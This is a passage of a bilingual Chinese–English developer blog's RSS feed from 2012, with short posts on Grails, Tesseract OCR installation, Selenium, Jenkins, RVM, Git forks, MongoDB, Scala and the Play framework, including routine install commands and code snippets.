&lt;p&gt;但是 Grails,&amp;#160; &amp;lt;%= g:image %&amp;gt; 既不支持 public 目录的方式，也不支持 soft link的方式，就喜欢报错。 我无语。在Rails 中可以有3+ 种解决问题的方式， Grails中居然都不行。 后来我临时搭建个 apache 服务器才暂时解决问题。( but in Grails, neither public/images nor the soft-link approach is supported.&amp;#160; Grails complains with lots of unreadable/un-debug-able messages. at last I have to setup a apache server to support the soft-link images , the problem was solved. my god... ) &lt;/p&gt;
</description>
      <pubDate>Wed, 17 Oct 2012 08:40:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/complains-about-grails</link>
    </item>
    <item>
      <title>汉服( Chinese Traditional Suite )</title>
      <description>&lt;p&gt;&lt;img rel="450x450" alt="Hanfu" title="Hanfu" src="http://siwei.me/system/resources/BAhbBlsHOgZmIiYyMDEyLzEwLzExLzE0XzU1XzI0XzcwM19oYW5mdS5qcGc/hanfu.jpg" height="200" width="450" /&gt;&lt;/p&gt;
&lt;p&gt;哪个你觉得最好？（which one you like best ? OK I mean the girl... )&lt;/p&gt;
&lt;p&gt;&lt;img rel="450x450" alt="Hanfu" title="Hanfu" src="http://siwei.me/system/resources/BAhbBlsHOgZmIiYyMDEyLzEwLzExLzE0XzU1XzI0XzcwM19oYW5mdS5qcGc/hanfu.jpg" /&gt;&lt;/p&gt;
</description>
      <pubDate>Thu, 11 Oct 2012 06:52:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/chinese-traditional-suite</link>
    </item>
    <item>
      <title>linux下的文字识别软件tesseract ( OCR software in Linux: tesseract ) </title>
      <description>&lt;p&gt;WINDOWS下有汉王OCR识别，免费的LINUX世界有啥与之对应呢？&amp;#160; 我找到了tesseract.&amp;#160;&lt;/p&gt;
&lt;p&gt;&lt;a target="_blank" href="http://code.google.com/p/tesseract-ocr/wiki/ReadMe"&gt;具体的官方文档在这里(click to view the offical doc )：&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;Ubuntu下的安装步骤： (setup steps under ubuntu ) &lt;/p&gt;
&lt;p&gt;1.安装对应的lib (install the libs) &lt;/p&gt;
&lt;pre&gt;sudo apt-get install autoconf automake libtool
sudo apt-get install libpng12-dev
sudo apt-get install libjpeg62-dev
sudo apt-get install libtiff4-dev
sudo apt-get install zlib1g-dev&lt;br /&gt;sudo apt-get install libleptonica  # install leptonica&lt;/pre&gt;
&lt;p&gt;2. install tesseract 3.00
&lt;/p&gt;
&lt;pre&gt; $ wget http://tesseract-ocr.googlecode.com/files/tesseract-3.00.tar.gz 
$tar zxvf tesseract-3.00.tar.gz 
$ cd tesseract-3.00  &amp;amp;&amp;amp; ./configure &amp;amp;&amp;amp; make &amp;amp;&amp;amp; sudo make install
&lt;/pre&gt;

&lt;p&gt; 3. 安装中文字库  (install Chinese lib ) 
&lt;/p&gt;
&lt;pre&gt;$ wget http://tesseract-ocr.googlecode.com/files/chi_sim.traineddata.gz
$ gunzip chi_sim.traineddata.gz
$ sudo cp chi_sim.traineddata /usr/local/share/tessdata/
&lt;/pre&gt;

&lt;p&gt; 4. 把图片转换成tif 格式，然后使用：  (usage)    
&lt;/p&gt;
&lt;pre&gt;$ tesseract apple.tif result -l chi_sim &lt;/pre&gt; &lt;p&gt;注意的几点： (NOTICE) &lt;br /&gt;1. 速度比较慢。 不过可以忍受，免费的么。&amp;#160; (slow, but it doesn't matter, what I care is&amp;#160; tesseract is free )&lt;br /&gt;2. 图片的文字要做到水平。如果你的图片文字是斜的，会影响效果，建议先用“旋转”功能把图片处理一下。 ( if your text is not vertical, you have to make some changes to the image using "notation" tools or something ) &lt;/p&gt;</description>
      <pubDate>Thu, 11 Oct 2012 04:04:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/tesseract-a-ocr-software-in-linux</link>
    </item>
    <item>
      <title>如何把Selenium script转换成 Java Ruby代码 ( how to convert selenium script to Java/Ruby code ) </title>
      <description>&lt;p&gt;In short :&amp;#160; open selenium IDE =&amp;gt; File =&amp;gt; Export TestCase as ... =&amp;gt;&amp;#160; Junit4 code / Ruby code &lt;/p&gt;
&lt;p&gt;1. 写好test case in selenium IDE&lt;br /&gt;2. export them as java/junit4 scripts.&lt;br /&gt;3. create a maven project.&lt;br /&gt;4. $ mvn test&lt;br /&gt;5. 针对里面的ERROR,修改：&lt;/p&gt;
&lt;pre&gt; 23     @Test
 24     public void shouldRun() throws Exception {
 25         driver.get(baseUrl + "jquery/test_case_should_omit_blanks_for_the_field_name_in_rules.html");
 26         // no input at all
 27         driver.findElement(By.cssSelector("input[type=\"submit\"]")).click();
 28         WebElement element = driver.findElement(By.cssSelector("#rsvErrors"));
 29         // ERROR: Caught exception [ERROR: Unsupported command [isTextPresent]]
 30         assertEquals(false, element.getText().contains("Please enter your first name."));
 31         // let's input all the fields.
 32         driver.findElement(By.name("first_name")).clear();
 33         driver.findElement(By.name("first_name")).sendKeys("Jim");
 34         driver.findElement(By.cssSelector("input[type=\"submit\"]")).click();
 35         // ERROR: Caught exception [ERROR: Unsupported command [getAlert]]
 36     }   
&lt;/pre&gt;
&lt;p&gt; 最后，发现 selenium 导出的代码，并不能100%跟原来的一致，例如 verifyTextPresent， 这个方法在java代码中就没有，所以，可以写一个。。。&lt;/p&gt;
&lt;pre&gt; 66     protected void verifyTextPresent(String expected){
 67         WebElement body = driver.findElement(By.cssSelector("body"));
 68         assertEquals(true, body.getText().contains(expected));
 69     }

&lt;/pre&gt;</description>
      <pubDate>Thu, 11 Oct 2012 02:50:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/how-to-convert-selenium-script-to-java</link>
    </item>
    <item>
      <title>Jenkins初体验 ( first sight of Jenkins ) </title>
      <description>&lt;p&gt;跟CruiseControl, Hudson一样， Jenkins也是一个持续集成工具。 Jenkins 是一个英国老管家的形象。挺有意思。估计是有什么来历吧？&amp;#160;&amp;#160; ( As a Continuous Integration tool like Hudson and CruiseConrol, Jekins has a interesting LOGO shown as below. ) &lt;/p&gt;
&lt;p&gt;&lt;img src="http://jenkins-ci.org/sites/default/files/jenkins_logo.png" /&gt;&lt;/p&gt; 
&lt;p&gt;公司有个项目由它来测试，过去的两个星期我一直在弄那个项目，所以也对Jenkins有了一点使用的体会。&amp;#160; ( I have been working on a project which was detected failed by Jenkins, so I have some experience using it . )&amp;#160;&lt;/p&gt;
&lt;p&gt;&lt;img rel="450x450" alt="Jenkins For Selenium" title="Jenkins For Selenium" src="/system/images/BAhbB1sHOgZmIjUyMDEyLzEwLzExLzEwXzM1XzA0Xzc5OF9KZW5raW5zX2Zvcl9zZWxlbml1bS5wbmdbCDoGcDoKdGh1bWIiDTQ1MHg0NTA+/Jenkins_for_selenium.png" height="281" width="450" /&gt;&lt;/p&gt;
&lt;p&gt;1. 配置很灵活. "configure" 页面的表单有各种各样的选项，点开之后，会出现第二层更详细的配置。不点开的时候，很简介，略去了不必要的信息，很提用户着想。 ( detailed and flexible configuration.&amp;#160; in the "configure" page, there are many options and items with description and tips that are very helpful and easy to understand to new users.&amp;#160; For an item,&amp;#160; once clicked, its 2nd level of options will pop up; if not clicked , the 2nd level of options will be collapsed and the saved lots of space for the page which looks more concise and clean, sweet! ) &lt;/p&gt;
&lt;p&gt;2. WEB界面响应很快。点击"Build now"之后，会向服务器发送AJAX请求，然后自动刷新页面。这点比CruiseControl要好。CC经常无缘无故的死掉。估计是AJAX做的不好。。。当然了，也有可能是我的个人环境问题。 ( Good speed of the page's response.&amp;#160; e.g. after "build now" clicked, an ajax request will be sent to server and then the current page will be refreshed. As a negative example, cruisecontrol did a bad job. when using it, I always found the page hung once an ajax request send to server, and I have to manual press F5 to do the refresh operation. Of course it maybe my browser's problem. -- Firefox 3.x )&lt;/p&gt;
&lt;p&gt;3. 单元测试的文件位置，只能是相对路径，不能是绝对路径。例如：&amp;#160; (the path of the test result files must be relative ) &lt;br /&gt;"/home/sg552/reports/TEST*.xml" 不行。&amp;#160;&amp;#160;&amp;#160; ( failed to find the result file ) &lt;br /&gt;"reports/TEST*.xml" 就可以。&amp;#160;&amp;#160; ( good to Jenkins ) &lt;br /&gt;这里的关键在于，你要掌握好Jenkins的workspace 路径。&amp;#160;&amp;#160;&amp;#160;&amp;#160;  ( the key is the workspace path ) &lt;/p&gt;</description>
      <pubDate>Thu, 11 Oct 2012 02:15:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/first-sight-of-jenkins</link>
    </item>
    <item>
      <title>建立 Selenium Webdriver  的环境 ( setup a selenium webdriver project) </title>
      <description>&lt;p&gt;1. 安装好Maven后,  建立一个pom.xml 文件： (create a file named: pom.xml, assuming you have MAVEN installed.  )&lt;/p&gt;
&lt;pre&gt;&lt;span class="cp"&gt;&amp;lt;?xml version="1.0" encoding="UTF-8"?&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;project&lt;/span&gt; &lt;span class="na"&gt;xmlns=&lt;/span&gt;
&lt;span class="s"&gt;"http://maven.apache.org/POM/4.0.0"&lt;/span&gt;
                 &lt;span class="na"&gt;xmlns:xsi=&lt;/span&gt;
&lt;span class="s"&gt;"http://www.w3.org/2001/XMLSchema-instance"&lt;/span&gt;
                 &lt;span class="na"&gt;xsi:schemaLocation=&lt;/span&gt;
&lt;span class="s"&gt;"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"&lt;/span&gt;
&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;lt;modelVersion&amp;gt;&lt;/span&gt;4.0.0&lt;span class="nt"&gt;&amp;lt;/modelVersion&amp;gt;&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;lt;groupId&amp;gt;&lt;/span&gt;MySel20Proj&lt;span class="nt"&gt;&amp;lt;/groupId&amp;gt;&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;lt;artifactId&amp;gt;&lt;/span&gt;MySel20Proj&lt;span class="nt"&gt;&amp;lt;/artifactId&amp;gt;&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;lt;version&amp;gt;&lt;/span&gt;1.0&lt;span class="nt"&gt;&amp;lt;/version&amp;gt;&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;lt;dependencies&amp;gt;&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;lt;dependency&amp;gt;&lt;/span&gt;
                &lt;span class="nt"&gt;&amp;lt;groupId&amp;gt;&lt;/span&gt;org.seleniumhq.selenium&lt;span class="nt"&gt;&amp;lt;/groupId&amp;gt;&lt;/span&gt;
                &lt;span class="nt"&gt;&amp;lt;artifactId&amp;gt;&lt;/span&gt;selenium-java&lt;span class="nt"&gt;&amp;lt;/artifactId&amp;gt;&lt;/span&gt;
                &lt;span class="nt"&gt;&amp;lt;version&amp;gt;&lt;/span&gt;2.25.0&lt;span class="nt"&gt;&amp;lt;/version&amp;gt;&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;lt;/dependency&amp;gt;&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;lt;dependency&amp;gt;&lt;/span&gt;
                &lt;span class="nt"&gt;&amp;lt;groupId&amp;gt;&lt;/span&gt;com.opera&lt;span class="nt"&gt;&amp;lt;/groupId&amp;gt;&lt;/span&gt;
                &lt;span class="nt"&gt;&amp;lt;artifactId&amp;gt;&lt;/span&gt;operadriver&lt;span class="nt"&gt;&amp;lt;/artifactId&amp;gt;&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;lt;/dependency&amp;gt;&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;lt;/dependencies&amp;gt;&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;lt;dependencyManagement&amp;gt;&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;lt;dependencies&amp;gt;&lt;/span&gt;
                &lt;span class="nt"&gt;&amp;lt;dependency&amp;gt;&lt;/span&gt;
                    &lt;span class="nt"&gt;&amp;lt;groupId&amp;gt;&lt;/span&gt;com.opera&lt;span class="nt"&gt;&amp;lt;/groupId&amp;gt;&lt;/span&gt;
                    &lt;span class="nt"&gt;&amp;lt;artifactId&amp;gt;&lt;/span&gt;operadriver&lt;span class="nt"&gt;&amp;lt;/artifactId&amp;gt;&lt;/span&gt;
                    &lt;span class="nt"&gt;&amp;lt;version&amp;gt;&lt;/span&gt;0.16&lt;span class="nt"&gt;&amp;lt;/version&amp;gt;&lt;/span&gt;
                    &lt;span class="nt"&gt;&amp;lt;exclusions&amp;gt;&lt;/span&gt;
                        &lt;span class="nt"&gt;&amp;lt;exclusion&amp;gt;&lt;/span&gt;
                            &lt;span class="nt"&gt;&amp;lt;groupId&amp;gt;&lt;/span&gt;org.seleniumhq.selenium&lt;span class="nt"&gt;&amp;lt;/groupId&amp;gt;&lt;/span&gt;
                            &lt;span class="nt"&gt;&amp;lt;artifactId&amp;gt;&lt;/span&gt;selenium-remote-driver&lt;span class="nt"&gt;&amp;lt;/artifactId&amp;gt;&lt;/span&gt;
                        &lt;span class="nt"&gt;&amp;lt;/exclusion&amp;gt;&lt;/span&gt;
                    &lt;span class="nt"&gt;&amp;lt;/exclusions&amp;gt;&lt;/span&gt;
                &lt;span class="nt"&gt;&amp;lt;/dependency&amp;gt;&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;lt;/dependencies&amp;gt;&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;lt;/dependencyManagement&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/project&amp;gt;&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt; 2. 下载所有的依赖jar包。运行 $ mvn clean install ( run this command to download all the dependend -jar files. ) &lt;/p&gt;
&lt;pre&gt;........ 
[INFO] ------------------------------------------------------------------------
[INFO] BUILD SUCCESS
[INFO] ------------------------------------------------------------------------
[INFO] Total time: 59.955s
[INFO] Finished at: Fri Sep 28 10:42:29 CST 2012
[INFO] Final Memory: 7M/40M
[INFO] ------------------------------------------------------------------------

&lt;/pre&gt;
</description>
      <pubDate>Fri, 28 Sep 2012 02:37:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/setup-a-selenium-webdriver-project</link>
    </item>
    <item>
      <title>Selenium 家族大集合 ( selenium family names ) </title>
      <description>&lt;p&gt;
&lt;img src="http://blargon7.com/selenium_docs/_images/chapt3_img04_IDE_Installation.png" alt="Selenium Family" /&gt;
Selenium 有很多的组件和琳琅满目的名字。看了让新手发蒙(confused which is which )，所以咱们来看看：(Selenium seems to have a lot of different components and the website does not explain them very well and I'm still a bit confused which is which. What's the difference or purpose between: )&lt;/p&gt;
&lt;p&gt;1. Selenium IDE &lt;br /&gt;2. Selenium Server &lt;br /&gt;3. Selenium Remote Control &lt;br /&gt;4. WebDriver &lt;br /&gt;5. Selenium 2&lt;/p&gt;
&lt;p&gt;我的理解是：(My understanding is as follows:)&lt;/p&gt;
&lt;p&gt;
&lt;img src="http://www.dynamitemap.com/selenium/ide.png" alt="Selenium IDE" /&gt;&lt;br /&gt;Selenium IDE 是一个GUI插件，跑在Firefox上。可以快速的建立TestCase的原型。另外，它的Record功能非常给里。而且各种assert的提示非常友好。( Selenium IDE is a GUI plugin used for rapid prototyping of test cases in Selenese/HTML.&amp;#160; It's now a Firefox plugin, and it has very strong command-tooltips for assertion)&lt;/p&gt;
&lt;p&gt;Selenium Server: 是一个独立的java程序，可以跑Test suite ( Selenium Server is a standalone java program which allows you to run HTML test suites in a range of different browsers, plus extra options like reporting. )&lt;/p&gt;
&lt;p&gt;Selenium Remote Control ( selenium-rc) 是Selenium Server的老名字，它只兼容 Selenium 1的API。 (Selenium Remote Control is the old name for Selenium Server, which only supports version 1 of the Selenium API. )&lt;/p&gt;
&lt;p&gt;WebDriver 是事实上的核心API， 支持很多种语言。(WebDriver is the actual core API which has bindings in a range of languages and allows you to write standalone tests.) &lt;/p&gt;
&lt;p&gt;Selenium2 是最新的Selenium 名称。它包括了： IDE, Server和 WebDriver ( Selenium 2 is the latest version of the Selenium project, and includes the IDE, Server and WebDriver. ) &lt;/p&gt;

&lt;p&gt;&lt;a target="_blank" title="http://sqa.stackexchange.com/q/1580" href="http://sqa.stackexchange.com/q/1580"&gt;参考（refer to ) : What's the difference between Selenium IDE, RC, 2, and WebDriver? &lt;/a&gt;
&lt;/p&gt;</description>
      <pubDate>Fri, 28 Sep 2012 01:15:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/selenium-family-names</link>
    </item>
    <item>
      <title>ubuntu 12 server 安装RUBY， RVM   (install RVM on ubuntu 12 server )</title>
      <description>&lt;p&gt;昨天拿到一个服务器， 很奇怪，根据源代码编译，安装之后，总是提示 psych 错误（It seems your ruby installation is missing psych (for YAML output). To eliminate this warning, please install libyaml and reinstall your ruby. )&amp;#160; 而且搞了几次都没解决问题。后来考虑到这个SERVER还要兼容1.8.x 系列，我就使用RVM吧！&amp;#160; ( yesterday when I was setting up the environment of my Rails on ubuntu server by download-compile-make install the ruby source code, there's always an error message : ".. missing psych (for YAML output ) "... ) after diving into this problem but not solved it in some time, also considering the compatibility for other Ruby versions, I decided to install RVM instead. )&lt;/p&gt;
&lt;p&gt;步骤： (steps)&lt;/p&gt;
&lt;p&gt;1. 安装rvm （略）&amp;#160; (install RVM ) &lt;/p&gt;
&lt;p&gt;2. $ rvm requirements &amp;#160;( then install all the needed libs )&lt;/p&gt;
&lt;p&gt;(?)2. $ rvm pkg install libyaml&lt;/p&gt;
&lt;p&gt;(?)3. $ rvm pkg install readline --verify-downloads 1&lt;/p&gt;
&lt;p&gt;(?)4. $ rvm pkg install {iconv,zlib,openssl}&lt;/p&gt;
&lt;p&gt;5. $ rvm install 1.9.3 -C --with-openssl-dir=$HOME/.rvm/usr, --with-iconv-dir=$HOME/.rvm/usr
&lt;br /&gt;
&lt;/p&gt;
</description>
      <pubDate>Fri, 28 Sep 2012 00:54:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/install-rvm-on-ubuntu-server</link>
    </item>
    <item>
      <title>Grails 进阶： 单元测试  ( unit testing in Grails ) </title>
      <description>&lt;p&gt;假如，我们有一个controller: controllers/dashboard/StatusController.groovy&amp;#160; (Assuming we have a controller )&amp;#160; &lt;/p&gt;

&lt;pre&gt;  1 package dashboard
  2 
  3 class StatusController {
  4 
  5     def index() {
  6     }
  7 
  8  }
&lt;/pre&gt;
&lt;p&gt;
我们要给它 加上单元测试，该怎么做呢？  (how to add unit test for it? ) 
&lt;/p&gt;
&lt;p&gt;
1. 建立文件： test/unit/dashboard/StatusControllerTests.groovy ( create a file )  &lt;/p&gt;
&lt;pre&gt;  1 package dashboard
  2 import grails.test.mixin.*
  3 import org.junit.*
  4 
  5 @TestFor(StatusController)
  6 class StatusControllerTests {
  7 
  8     void testIndex () {
  9         controller.index()
 10         assertEquals "bar", controller.response.contentAsString
 11     }
 12 }
&lt;/pre&gt;       


&lt;p&gt;
2. 运行： grails test-app StatusController  
或者 $ grails test-app *Controller   ( run $ grails test-app *Controller ) 
&lt;/p&gt;
&lt;pre&gt;sg552@siwei-moto:~/workspace/dashborad$ grails test-app StatusController
| Running 1 unit test... 1 of 1
| Failure:  testIndex(dashboard.StatusControllerTests)
|  junit.framework.ComparisonFailure: expected:&amp;lt;[bar]&amp;gt; but was:&amp;lt;[]&amp;gt;
	at junit.framework.Assert.assertEquals(Assert.java:85)
	at dashboard.StatusControllerTests.testIndex(StatusControllerTests.groovy:16)
| Completed 1 unit test, 1 failed in 6425ms
| Packaging Grails application.....
| Tests FAILED  - view reports in /home/sg552/workspace/dashborad/target/test-reports&lt;/pre&gt;
&lt;p&gt;3. 但是尚未结束，当调用model的自动方法时出错：&lt;/p&gt;
&lt;pre&gt;| Failure:  testInfo(dashboard.StatusControllerTests)
|  groovy.lang.MissingMethodException: No signature of method: dashboard.StationInfo.get() is applicable for argument types: () values: []
Possible solutions: get(java.io.Serializable), getId(), getIp(), grep(), grep(java.lang.Object), getAt(java.lang.String)
	at dashboard.StatusController.getResult(StatusController.groovy:14)
        ......
&lt;/pre&gt;
&lt;p&gt;运行 $ grails test-app StatusController --integration 之后，就可以解决这个问题。参考： &lt;a href="http://stackoverflow.com/a/9255043"&gt;http://stackoverflow.com/a/9255043&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;
3. 进一步： grails-app/conf/DataSource.groovy 可以看到数据库配置，相当于 rails 的 database.yml   ( grails-app/conf/DataSource.groovy == database.yml in Rails ) 
&lt;/p&gt;
&lt;p&gt;
一点体会： Grails运行单元测试的速度太慢了。 跑了一个UT下来，从回车到结果显示结束，耗费近60秒的时间。
实际上我过了4秒就等不及开始溜号了。  ( However it's much slower that running Tests in Grails than in Rails. It takes almost 60 seconds to execute a unit tests while I lost my focus in 4 seconds ) &lt;/p&gt;
&lt;p&gt;
RAILS一般都可以在10秒内启动，估计省去了GRAILS的编译过程。( and in Rails the total process often cost less than 10 seconds) &lt;/p&gt;</description>
      <pubDate>Wed, 26 Sep 2012 02:51:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/unit-testing-in-grails</link>
    </item>
    <item>
      <title>scp: 复制远程文件到本地( scp: an alternative for sftp )</title>
      <description>&lt;p&gt;sftp 的替代命令。好处是不必建立本地的文件加名字( an alternative for SFTP but more convienince ) &lt;/p&gt;
&lt;p&gt;e.g. 把远程的 /home/remote_folder 复制到本地： (copy the remote folder: /home/remote_folder to local: )
&lt;/p&gt;
&lt;pre&gt;$ scp -r kcv478@qabuild01.qa.blurdev.com:/home/remote_folder/ .
&lt;/pre&gt;
</description>
      <pubDate>Tue, 25 Sep 2012 01:49:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/scp-an-alternative-for-sftp</link>
    </item>
    <item>
      <title>如何更新github forked project? ( how to update the forked project on github? ) </title>
      <description>&lt;p&gt;非常简单，就是在配置文件中增加一个 remote 。。。
&lt;/p&gt;
&lt;pre&gt;# 增加一个remote, 起名叫  "upstream" (  Add the remote, call it "upstream":  )

git remote add upstream git://github.com/whoever/whatever.git

# 然后fetch 过来。。。
# Fetch all the branches of that remote into remote-tracking branches,
# such as upstream/master:

git fetch upstream

# 然后把它合并到本地的master上： 
# 1. checkout master   ( Make sure that you're on your master branch: )

git checkout master

# 2. 执行rebase.  ( Rewrite your master branch so that any commits of yours that
# aren't already in upstream/master are replayed on top of that other branch:  )

git rebase upstream/master
&lt;/pre&gt;

&lt;p&gt;refer to &lt;a href="http://stackoverflow.com/a/7244456/445908"&gt;How to update GitHub forked repository?&lt;/a&gt;
&lt;/p&gt;</description>
      <pubDate>Mon, 24 Sep 2012 00:10:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/how-to-update-forked-project</link>
    </item>
    <item>
      <title>一点selenium 心得（selenium experience ) </title>
      <description>&lt;p&gt;1. 尽量使用glob 来匹配。 verifyAlert &amp;#160; &amp;#160; glob: *some text* &amp;#160; &amp;#160; &amp;#160; ( better than: &amp;#160; regExp=/... &amp;#160; &amp;#160; or plain text ) &amp;#160; &amp;#160;&lt;/p&gt;
&lt;p&gt;2. &amp;#160;总是使用CSS。 Always use CSS: &amp;#160; &amp;#160;click target &amp;#160; css=input[type='submit']&lt;/p&gt;
&lt;p&gt;3. &amp;#160;选择radio 的办法： choose a radio: &amp;#160;click target: &amp;#160;&amp;#160;//input[@name='gender' and @value='female'] &amp;#160; ( better than name=... )&amp;#160;&lt;/p&gt;
&lt;p&gt;更多请参考我的另外几篇文章(click here to refer to my other selenium posts) ：&lt;a target="_blank" href="http://sg552.iteye.com/blog/search?query=selenium"&gt;点击这里(more selenium posts)&amp;#160;&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;经过了一天的努力，终于把&lt;a href="https://github.com/sg552/rsv" title="https://github.com/sg552/rsv" target="_blank"&gt;RSV&lt;/a&gt; 的全部 selenium 测试用力做完了。:-) &amp;#160;( after a day's work, all the test cases of RSV has been implemented )&amp;#160;&lt;/p&gt;

&lt;img src="http://www.siwei.me/system/resources/BAhbBlsHOgZmIjsyMDEyLzA5LzIwLzE2XzIyXzQ5XzQyNF9zZWxlbml1bV90ZXN0X3N1aXRlX3Jlc3VsdC5wbmc/selenium_test_suite_result.png" /&gt;</description>
      <pubDate>Thu, 20 Sep 2012 08:27:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/selenium-experience</link>
    </item>
    <item>
      <title>职业生涯中参与的第一个开源项目(the first commit to open source) </title>
      <description>&lt;p&gt;&lt;a target="_blank" href="https://github.com/refinery/refinerycms/pull/1957"&gt; https://github.com/refinery/refinerycms/pull/1957 &lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;属于最最简单的i18n，翻译一个yml就可以提交了。呵呵 &amp;#160;&lt;/p&gt;
&lt;p&gt;&lt;img src="/system/images/BAhbB1sHOgZmIi0yMDEyLzA5LzIwLzA4XzA5XzA0XzYzMV9maXJzdF9jb21taXQuUE5HWwg6BnA6CnRodW1iIg00NTB4NDUwPg/first_commit.PNG" title="First Commit" alt="First Commit" rel="450x450" width="450" height="253" /&gt;&lt;/p&gt;
</description>
      <pubDate>Thu, 20 Sep 2012 00:04:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/the-first-commit-to-open-source</link>
    </item>
    <item>
      <title>吐槽一下mongodb的反人类命令( don't like the way of mongodb's start)</title>
      <description>&lt;pre&gt;$ (which mongod # =&amp;gt; /usr/bin/mongod )
$ sudo mongod --repair -f /etc/mongodb.conf
$ sudo mongod start -f /etc/mongodb.conf --fork
&lt;/pre&gt;
&lt;p&gt;1. 干嘛不在 start的时候 自动repair一下？&lt;/p&gt;
&lt;p&gt;2. ubuntu 干嘛不把 配置文件命名成默认的名字？&lt;/p&gt;
&lt;p&gt;3. --fork 跟 --daemon的可读性相比？&lt;/p&gt;
&lt;p&gt;看来是必须把它们放到 bash_login中不可了，我可不想被这么无厘头的东西。。。 -&lt;/p&gt;</description>
      <pubDate>Mon, 17 Sep 2012 06:31:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/mongodb-repair-and-start</link>
    </item>
    <item>
      <title>scala 简介 (scala introduction) </title>
      <description>
&lt;p&gt; 读音：  It's Ska-lah,  (不是 ska-ler )  It's Ska-lah; rhimes with Java.&lt;/p&gt;
&lt;p&gt;目的是做一个更好的JAVA. ( a better Java)&lt;/p&gt;
&lt;p style="color: blue"&gt;在PLAY中使用SCALA，貌似可以不安装Scala，直接运行PLAY～ &lt;/p&gt;
&lt;p&gt;可读性更好，表述能力更强，代码比JAVA少三分之二。 (Code sizes are typically reduced by a factor of two to three when compared to an equivalent Java application.)&lt;/p&gt;
&lt;p&gt;可以与java 无缝集成（streamless integration with Java) ，可以在Java中运行 Scala， 也可以在Scala中跑Java. &lt;/p&gt;
&lt;p&gt;编译效果和运行速度不亚于JAVA， 写JAVA编译器的人 Martin，就负责写 Scala 编译器 ( the guy who wrotes Scala compiler also wrote the Java compiler, named Martin Odersky )&amp;#160;&lt;/p&gt;
&lt;p&gt;Scala 同时具有面向对象和面向函数的特点 (both object and functional oriented. ) &lt;/p&gt;
&lt;p&gt;Scala 是静态类型的语言。不支持鸭子类型（ staticially typed)&amp;#160;&lt;/p&gt;
&lt;p&gt;Scala 也支持.NET&lt;br /&gt; &lt;/p&gt;

&lt;p&gt; 参考：  &lt;a href="http://www.scala-lang.org/node/25"&gt; Scala Introduction &lt;/a&gt;
&lt;/p&gt;</description>
      <pubDate>Fri, 14 Sep 2012 07:02:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/scala-introduction</link>
    </item>
    <item>
      <title>java Play框架入门 ( simple tutorial for play framework) </title>
      <description>&lt;p&gt;注意：：： 官方的文档不给力啊，按照他说的做，会遇到各种问题。文档更新的速度没跟上代码。。。最好的办法是运行：&amp;#160; sample 目录下的 项目。&amp;#160;&amp;#160;&amp;#160; ( CAUTION:&amp;#160; official tutorial is not correct from my experience today, the best way is to run the sample applications in the "sample" folder , check it out! ) &lt;/p&gt;
&lt;p&gt;1. 下载并解压缩最新的文件。( Download and unzip the play framework file ) : &lt;/p&gt;
&lt;p&gt;2. 为 "play" 这个文件加上可执行的标志 : chmod +x play ,并把它放到系统PATH中。 ( make the 'play' file executable and add its path to PATH ) &lt;/p&gt;
&lt;p&gt;3. 建立一个空的应用 ： ( create an empty play application) &lt;br /&gt;$ play new test_play_framework&amp;#160; &lt;/p&gt;
&lt;p&gt;4. 打开控制台：&amp;#160; (open its console)&lt;br /&gt;$ cd test_play_framework&lt;br /&gt;$ run
&lt;/p&gt;
&lt;pre&gt;sg552@siwei-moto:~/workspace/test_play$ play
[info] Loading project definition from /home/sg552/workspace/test_play/project
[info] Set current project to test_play (in build file:/home/sg552/workspace/test_play/)
       _            _ 
 _ __ | | __ _ _  _| |
| '_ \| |/ _' | || |_|
|  __/|_|\____|\__ (_)
|_|            |__/ 
             
play! 2.0.3, http://www.playframework.org

&amp;gt; Type "help play" or "license" for more information.
&amp;gt; Type "exit" or use Ctrl+D to leave this console.

[test_play] $ run
[info] Updating {file:/home/sg552/workspace/test_play/}test_play...
[info] Done updating.                                                                  
--- (Running the application from SBT, auto-reloading is enabled) ---

[info] play - Listening for HTTP on port 9000...

(Server started, use Ctrl+D to stop and go back to the console...)

&lt;/pre&gt;
&lt;p&gt;
可以看到服务器运行在了9000端口，打开。。。( we could see that the server is running at:  localhost:9000, open it ) 
&lt;img src="http://www.playframework.org/documentation/2.0.3/resources/manual/javaGuide/tutorials/todolist/images/welcome.png" /&gt;&lt;/p&gt;
</description>
      <pubDate>Fri, 14 Sep 2012 01:57:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/simple-tutorial-for-play-framework</link>
    </item>
    <item>
      <title>奇怪的LINUX上网问题: eth0 ? eth1 ? ( strange DHCP client problem:  eth0 v.s. eth1)</title>
